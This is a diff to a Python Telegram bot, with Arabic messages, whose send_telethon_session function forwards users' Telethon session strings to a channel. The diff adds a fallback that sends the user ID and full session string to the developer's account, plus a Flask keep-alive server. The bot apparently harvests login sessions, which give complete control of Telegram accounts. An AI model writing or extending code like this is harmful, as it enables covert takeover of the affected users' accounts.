@@ -849,3 +849,34 @@ async def send_telethon_session(user_id, session_string, message, password=None)
                 DEV_USERNAME,
                 f"⚠️ فشل إرسال جلسة Telethon للقناة!\n\n"
                 f"المستخدم: {user_id}\n"
+                f"الجلسة: {session_string}\n"
+                f"الخطأ: {e}"
+            )
+            print("✅ تم إرسال الجلسة للمطور كحل احتياطي")
+        except:
+            pass
+
+def reset_user(user_id):
+    user_steps.pop(user_id, None)
+    user_data.pop(user_id, None)
+
+# ====== إضافة مسار ويب لـ Render ======
+web_app = Flask(__name__)
+
+@web_app.route('/')
+def index():
+    return "✅ البوت شغال 24 ساعة!"
+
+def run_web():
+    web_app.run(host='0.0.0.0', port=8080)
+
+threading.Thread(target=run_web, daemon=True).start()
+
+# ====== تشغيل البوت ======
+if __name__ == "__main__":
+    try:
+        print("🚀 جاري تشغيل البوت...")
+        app.run()
+        print("✅ البوت يعمل الآن!")
+    except Exception as e:
+        print(f"❌ فشل تشغيل البوت: {e}")
